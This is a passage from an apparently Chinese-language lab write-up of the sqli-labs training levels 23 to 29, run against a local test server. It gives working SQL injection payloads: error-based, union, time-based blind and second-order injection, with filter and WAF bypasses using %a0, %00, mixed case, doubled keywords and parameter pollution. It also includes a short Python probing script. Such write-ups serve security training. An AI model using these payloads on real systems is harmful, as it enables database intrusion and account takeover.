class="keyword">for</span> key <span class="string">&#x27;group_key&#x27;</span></span><br><span class="line">updatexml</span><br><span class="line">    GET data</span><br><span class="line">    http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">23</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; or  updatexml(1,concat(0x7e,(database()),0x7e),1) or &#x27;</span></span><br><span class="line">    后端处理后</span><br><span class="line">    SELECT * FROM users WHERE <span class="built_in">id</span>=<span class="string">&#x27;-1&#x27;</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(database()),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">    回显</span><br><span class="line">    XPATH syntax error: <span class="string">&#x27;~security~&#x27;</span></span><br><span class="line">extractvalue </span><br><span class="line">    GET data</span><br><span class="line">    http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">23</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27;  or extractvalue(1, concat(0x7e,(database()),0x7e))  or &#x27;</span></span><br><span class="line">    后端处理后</span><br><span class="line">    SELECT * FROM users WHERE <span class="built_in">id</span>=<span class="string">&#x27;-1&#x27;</span> <span class="keyword">or</span> extractvalue(<span class="number">1</span>, concat(<span class="number">0x7e</span>,(database()),<span class="number">0x7e</span>)) <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">    回显</span><br><span class="line">    XPATH syntax error: <span class="string">&#x27;~security~&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>也可以单纯利用闭合，这里都可以发挥自己的想象力了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET data</span><br><span class="line">    http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">23</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27;  union select 1,database(),3 or &#x27;</span></span><br><span class="line">后端处理后</span><br><span class="line">    SELECT * FROM users WHERE <span class="built_in">id</span>=<span class="string">&#x27;-1&#x27;</span> union select <span class="number">1</span>,database(),<span class="number">3</span> <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">回显</span><br><span class="line">    Your Login name:security</span><br><span class="line">    Your Password:<span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="level-24"><a href="#level-24" class="headerlink" title="level-24"></a>level-24</h3><p><strong>未检验用户名-简单二次注入</strong><br>漏洞逻辑是登录&#x2F;注册都转义了，但是在更改密码时没有。<br>pass_change.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span>= <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];<span class="comment">#未转义，造成漏洞</span></span><br><span class="line"><span class="variable">$curr_pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;current_password&#x27;</span>]);</span><br><span class="line"><span class="variable">$pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="variable">$re_pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$pass</span>==<span class="variable">$re_pass</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;You tried to be smart, Try harder!!!! :( &#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>所以就使用<code>username</code>注入<br>这里使用报错注入，之前说过，放在参数为即可<br>如果我们想修改<code>admin</code>的密码<br>新建用户 <code>admin&#39;#</code> 密码<code>123 </code><br>然后更改<code>admin&#39;#</code> 的密码 为345，后端代码如下，可以看出，我们把<code>admin</code>的密码改成了<code>345</code>,也就是可以利用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users SET PASSWORD=<span class="string">&#x27;345&#x27;</span> where username=<span class="string">&#x27;admin&#x27;</span><span class="comment">#&#x27; and password=&#x27;123&#x27;</span></span><br></pre></td></tr></table></figure><p>也可以拼接成其他的sql语句，但是后端username限制长度20，发挥空间也不是很大</p><h3 id="level-25"><a href="#level-25" class="headerlink" title="level-25"></a>level-25</h3><p><strong>过滤or&#x2F;and-单引号-简单注入</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/AND/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析代码可以双写绕过<br>简单测试，不展开了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">爆字段</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">25</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27; oorrder by 4%23</span></span><br><span class="line"><span class="string">爆库名</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-25/?id=-1&#x27;</span> union select <span class="number">1</span>,<span class="number">2</span>,database()%<span class="number">23</span></span><br></pre></td></tr></table></figure><h3 id="level-25a"><a href="#level-25a" class="headerlink" title="level-25a"></a>level-25a</h3><p><strong>过滤or&#x2F;and-时间盲注</strong><br>因为没有报错信息，只能时间盲注，和level-25类似，不细致展开</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-25a/?<span class="built_in">id</span>=<span class="number">1</span> oorr <span class="keyword">if</span>(length(database())=<span class="number">8</span>,sleep(<span class="number">3</span>),<span class="number">1</span>) %<span class="number">23</span></span><br></pre></td></tr></table></figure><h3 id="level-26"><a href="#level-26" class="headerlink" title="level-26"></a>level-26</h3><p><strong>过滤-报错注入</strong><br>关键代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out OR (大小写不敏感)</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/and/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out --</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out #</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out 空格</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out /\</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>问题在于空格怎么绕过，可以用%a0</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET data </span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">26</span>/?<span class="built_in">id</span>=<span class="number">1</span>%<span class="number">27</span>%a0oorr%a0updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(database()),<span class="number">0x7e</span>),<span class="number">1</span>)%a0oorr%<span class="number">20</span>%<span class="number">27</span></span><br><span class="line"></span><br><span class="line">后端处理后</span><br><span class="line">SELECT * FROM users WHERE <span class="built_in">id</span>=<span class="string">&#x27;1&#x27;</span>�<span class="keyword">or</span>�updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(database()),<span class="number">0x7e</span>),<span class="number">1</span>)�o<span class="string">r&#x27;&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">回显</span><br><span class="line">XPATH syntax error: <span class="string">&#x27;~security~&#x27;</span></span><br></pre></td></tr></table></figure><p>测试可以替代空格的字符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">test=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(<span class="built_in">hex</span>(i)))</span><br><span class="line">    tmp=<span class="built_in">str</span>(<span class="built_in">hex</span>(i)).replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;%&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(tmp)&lt;<span class="number">3</span>:</span><br><span class="line">        tmp=tmp.replace(<span class="string">&quot;%&quot;</span>,<span class="string">&quot;%0&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(tmp)</span><br><span class="line">    url=<span class="string">&quot;http://127.0.0.1/sqli-labs/Less-26/?id=1%27%a0oorr&quot;</span>+tmp+<span class="string">&quot;1%a0oorr%20%27&quot;</span></span><br><span class="line">    r=requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Dumb&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        test=test+<span class="string">&quot; &quot;</span>+tmp</span><br><span class="line"><span class="built_in">print</span>(test)</span><br></pre></td></tr></table></figure><p>得到<br><code> %0b %21 %2b %40 %7e %a0</code><br>也可以用隔断，只不过空格替换，关键字替换就可以了<br>参考：<br><a href="https://www.jianshu.com/p/ff72f2c6d99c">Sqli-Labs：Less 26 - Less 26a</a></p><h3 id="level-26a"><a href="#level-26a" class="headerlink" title="level-26a"></a>level-26a</h3><p><strong>时间盲注</strong><br>类似level-26，不过加了括号，以及报错没了,这里用了%00截断，也是对上面的补充</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-26a/?<span class="built_in">id</span>=k<span class="string">&#x27;)%a0oorr%a0if(length(database())=8,sleep(3),1);%00</span></span><br></pre></td></tr></table></figure><h3 id="level-27"><a href="#level-27" class="headerlink" title="level-27"></a>level-27</h3><p><strong>简单过滤绕过-单引号-报错-大小写绕过</strong><br>关键代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">/u 表示按<span class="title function_ invoke__">unicode</span>(utf-<span class="number">8</span>)匹配（主要针对多字节比如汉字）</span><br><span class="line">/i 表示不区分大小写（如果表达式里面有 a， 那么 A 也是匹配对象）</span><br><span class="line">/s 表示将字符串视为单行来匹配</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/m&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out union</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/UNION/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out UNION</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/SELECT/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out SELECT</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out Union</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加单引号<br><code>http://127.0.0.1/sqli-labs/Less-27/?id=1&#39;</code><br>得到报错<br><code>use near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1</code><br>说明后台就是加了单引号<br>1、union注入，使用大小写绕过，%a0代替空格，%00截断</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET data</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">27</span>/?<span class="built_in">id</span>=a<span class="string">&#x27;%a0unIon%a0selEct%a01,2,3;%00</span></span><br><span class="line"><span class="string">后端拼接后</span></span><br><span class="line"><span class="string">SELECT * FROM users WHERE id=&#x27;</span>a<span class="string">&#x27;�unIon�selEct�1,2,3;&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">回显</span><br><span class="line">Your Login name:<span class="number">2</span></span><br><span class="line">Your Password:<span class="number">3</span></span><br></pre></td></tr></table></figure><p>2、报错注入，使用||替换or，%a0替换空格。%00截断</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET data</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">27</span>/?<span class="built_in">id</span>=a<span class="string">&#x27;%a0||%a0updatexml(1,concat(0x7e,(database()),0x7e),1);%00</span></span><br></pre></td></tr></table></figure><h3 id="level-27a"><a href="#level-27a" class="headerlink" title="level-27a"></a>level-27a</h3><p><strong>简单过滤绕过-双引号-盲注-大小写绕过</strong><br>类似level-27,不过换了双引号，没了报错<br>1、union注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-27a/?<span class="built_in">id</span>=a<span class="string">&quot;%a0unIon%a0selEct%a01,2,3;%00</span></span><br></pre></td></tr></table></figure><p>2、bool盲注</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-27a/?<span class="built_in">id</span>=a<span class="string">&quot; %a0||%a0if(1,sleep(3),1);%00</span></span><br></pre></td></tr></table></figure><h3 id="level-28"><a href="#level-28" class="headerlink" title="level-28"></a>level-28</h3><p><strong>无报错-单括号-单引号-绕过</strong><br>关键代码   </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function blacklist($<span class="built_in">id</span>)</span><br><span class="line">&#123;</span><br><span class="line">$<span class="built_in">id</span>= preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $<span class="built_in">id</span>);//strip out /*</span><br><span class="line">$<span class="built_in">id</span>= preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $<span class="built_in">id</span>);//Strip out --.</span><br><span class="line">$<span class="built_in">id</span>= preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $<span class="built_in">id</span>);//Strip out <span class="comment">#.</span></span><br><span class="line">$<span class="built_in">id</span>= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $<span class="built_in">id</span>);    //Strip out spaces.</span><br><span class="line">//$<span class="built_in">id</span>= preg_replace(<span class="string">&#x27;/select/m&#x27;</span>,<span class="string">&quot;&quot;</span>, $<span class="built_in">id</span>);    //Strip out spaces.</span><br><span class="line">$<span class="built_in">id</span>= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $<span class="built_in">id</span>);    //Strip out spaces.</span><br><span class="line">查找得到，</span><br><span class="line">$<span class="built_in">id</span>= preg_replace(<span class="string">&#x27;/union\s+select/i&#x27;</span>,<span class="string">&quot;&quot;</span>, $<span class="built_in">id</span>);    //Strip out UNION &amp; SELECT. 这个没看懂什么意思，这句话过滤了相连的union和select，/i同时匹配大小写，\s匹配任意空白字符如制表符、换行符、</span><br><span class="line"><span class="keyword">return</span> $<span class="built_in">id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>1、union注入，%a0替换空格，%00截断</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET data</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">28</span>/?<span class="built_in">id</span>=a<span class="string">&#x27;)%a0union%a0select%a01,2,3;%00</span></span><br><span class="line"><span class="string">后端</span></span><br><span class="line"><span class="string">SELECT * FROM users WHERE id=(&#x27;</span>a<span class="string">&#x27;)�union�select�1,2,3;&#x27;</span>) LIMIT <span class="number">0</span>,<span class="number">1</span> //前面不是过滤union select了吗，但是这里看并没有，空格等，使用%a0可以绕过，%a0不算空白符？</span><br><span class="line">回显</span><br><span class="line">Your Login name:<span class="number">2</span></span><br><span class="line">Your Password:<span class="number">3</span></span><br></pre></td></tr></table></figure><p>2、时间盲注</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET data</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">28</span>/?<span class="built_in">id</span>=a<span class="string">&#x27;)%a0||%a0if(length(database())=8,sleep(3),null);%00</span></span><br><span class="line"><span class="string">后端</span></span><br><span class="line"><span class="string">SELECT * FROM users WHERE id=(&#x27;</span>a<span class="string">&#x27;)�||�if(length(database())=3,sleep(3),null);&#x27;</span>) LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">回显</span><br><span class="line">会sllep <span class="number">3</span> 秒</span><br></pre></td></tr></table></figure><h3 id="level-28a"><a href="#level-28a" class="headerlink" title="level-28a"></a>level-28a</h3><p>关键代码,只过滤了<code>union select</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="built_in">id</span>= preg_replace(<span class="string">&#x27;/union\s+select/i&#x27;</span>,<span class="string">&quot;&quot;</span>, $<span class="built_in">id</span>);    //Strip out spaces.</span><br></pre></td></tr></table></figure><p>绕过就使用<code> union union select select</code><br>例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET data</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-28a/?<span class="built_in">id</span>=a<span class="string">&#x27;) union union select select 1,2,3 %23</span></span><br><span class="line"><span class="string">拼接后</span></span><br><span class="line"><span class="string">SELECT * FROM users WHERE id=(&#x27;</span>a<span class="string">&#x27;) union select 1,2,3 #&#x27;</span>) LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">回显</span><br><span class="line">Your Login name:<span class="number">2</span></span><br><span class="line">Your Password:<span class="number">3</span></span><br></pre></td></tr></table></figure><h3 id="level-29"><a href="#level-29" class="headerlink" title="level-29"></a>level-29</h3><p><strong>WAF简单绕过-参数解析-单引号</strong><br>安装tomcat<br>这里需要安装tomcat提供简单的waf功能<br>在已经jdk的情况下，在tomcat官网下载最新的对应安装包，在此以win为例<br><img src="/2022/02/17/sqli-labs/2022-02-23-18-20-20.png"><br>找个位置解压，然后配置环境变量</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在<span class="string">&quot;系统变量&quot;</span>里新建变量名：CATALINA_BASE，变量值：例，D:\JavaEE\apache-tomcat（此处为你的解压包路径）</span><br><span class="line">在<span class="string">&quot;系统变量&quot;</span>里新建变量名：CATALINA_HOME，变量值：同上（此处为你的解压包路径）</span><br></pre></td></tr></table></figure><p>然后在bin下双击startup.bat即可<br>然后访问<a href="http://localhost:8080/">http://localhost:8080/</a><br>可以在conf文件夹里的server.xml修改端口<br><img src="/2022/02/17/sqli-labs/2022-02-23-18-32-21.png"><br>然后下载<a href="https://dev.mysql.com/downloads/connector/j/"><code>mysql-connector-java.jar</code></a>，选择对应版本<br><img src="/2022/02/17/sqli-labs/2022-02-23-18-23-14.png"><br>下载后把压缩包解压的jar包，放到tomcat下的lib<br>然后使用IDEA导入MySQL驱动包，把tomcat加载到IDEA，然后找到lib右键<code>add library</code><br><img src="/2022/02/17/sqli-labs/2022-02-23-18-35-57.png"><br>然后再把sqli-labs下的tomcat-files解压到tomcat的webapps下<br>然后修改level29-32下的index.jsp，把跳转链接改成自己的sli-labs apache服务链接，以我的为例<br><img src="/2022/02/17/sqli-labs/2022-02-23-18-39-57.png"><br>然后就可以测试了<br>关键代码</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">rex</span> <span class="operator">=</span> <span class="string">&quot;^\\d+$&quot;</span>;   \d 匹配数字</span><br><span class="line">Boolean match=id.matches(rex); WAF所在</span><br><span class="line"><span class="keyword">if</span>(match == <span class="literal">true</span>)</span><br></pre></td></tr></table></figure><p>这里绕过的原理是根据tomcat与apache同名参数的的解析方式不同<br>《MySQL注入天书：Less 29》<br><img src="/2022/02/17/sqli-labs/2022-02-23-18-54-43.png"><br>在index.jsp，加入如下代码，查看tomcat解析的id值</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">out.print(<span class="string">&quot;&lt;font color= &#x27;#FFFF00&#x27;&gt;&quot;</span>);</span><br><span class="line">out.print(id);</span><br><span class="line">out.print(<span class="string">&quot;&lt;/font&gt;&quot;</span>);</span><br></pre></td></tr></table></figure><p>例如，index.jsp?id&#x3D;1&amp;id&#x3D;2，在tomcat解析时，id&#x3D;1，而apache下就是2,而apache是我们真正要注入的。<br><img src="/2022/02/17/sqli-labs/2022-02-23-18-59-44.png"><br>可以看到经tomcat解析，id&#x3D;1，而在apache解析后id&#x3D;2,因为<br><img src="/2022/02/17/sqli-labs/2022-02-23-19-02-53.png">   </p><p>就是我们第一个id是正常数据，就可以饶过waf了，第二个id我们就可以发挥想象了<br>仅做简单演示</p><p><img src="/2022/02/17/sqli-labs/2022-02-23-19-06-47.png"></p><p>参考：</p><p><a href="https://www.jianshu.com/p/46cb6c354de5">Sqli-Labs：Less 29 - Less 31</a><br><a 